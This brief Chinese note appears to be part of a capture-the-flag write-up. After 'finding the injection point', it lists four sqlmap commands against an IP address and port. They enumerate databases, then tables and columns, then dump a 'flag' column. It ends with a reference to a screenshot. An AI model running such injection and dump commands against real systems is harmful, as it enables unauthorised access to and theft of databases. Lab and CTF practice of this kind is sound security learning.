找到注入点后：

```
python sqlmap.py -u ”http://1.14.71.254:28149/index.php?id=1" --dbs

python sqlmap.py -u “http://1.14.71.254:28149/index.php?id=1” -D test_db --tables

python sqlmap.py -u “http://1.14.71.254:28149/index.php?id=1” -D test_db -T test_tb --columns

python sqlmap.py -u “http://1.14.71.254:28149/index.php?id=1” -D test_db -T test_tb -C flag --dump
```
![[Pasted image 20231207112248.png]]

